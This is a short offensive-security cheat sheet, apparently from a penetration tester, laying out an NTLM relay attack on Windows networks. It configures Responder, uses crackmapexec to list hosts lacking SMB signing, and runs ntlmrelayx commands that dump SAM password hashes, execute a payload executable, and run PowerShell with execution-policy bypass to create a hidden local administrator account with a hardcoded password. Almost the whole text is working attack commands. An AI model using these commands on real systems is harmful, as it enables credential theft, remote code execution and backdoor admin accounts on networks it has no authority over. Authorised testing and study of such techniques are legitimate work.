Open firewall to connecting systems

```
ufw allow from <CIDR>
```

Change Responder Config
Turn Off SMB and HTTP in responder.conf

/etc/responder/Responder.conf

SQL = On
**SMB = Off**
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
**HTTP = Off**

Generate a list of SMB no-sign systems

```
crackmapexec smb <CIDR> --gen-relay-list ~/Desktop/NoSign.txt
```

Open two terminal sessions. In one start responder.

```
responder -I <interface> -r -d -w
```

In the second start ntlmrelayx.

```
ntlmrelay.py -tf ~/Desktop/NoSign.txt -smb2support -of ~/Desktop/NTLMhashes.txt
```

By default this will dump the SAM if the user is a local/domain admin.

If a payload is known good on the network, could also execute a payload with -e.

```
ntlmrelay.py -tf ~/Desktop/NoSign.txt -smb2support -of ~/Desktop/NTLMhashes.txt -e ~/Desktop/Payload.exe
```

Alternatively, could execute a system command using -c

```
ntlmrelay.py -tf ~/Desktop/NoSign.txt -smb2support -of ~/Desktop/NTLMhashes.txt -c powershell -ep bypass; $Password = ConvertTo-SecureString "CISAster2021!" -AsPlainText -Force; New-LocalUser "DHStest" -Password $Password; Add-LocalGroupMember -Group "Administrators" -Member "DHStest"
```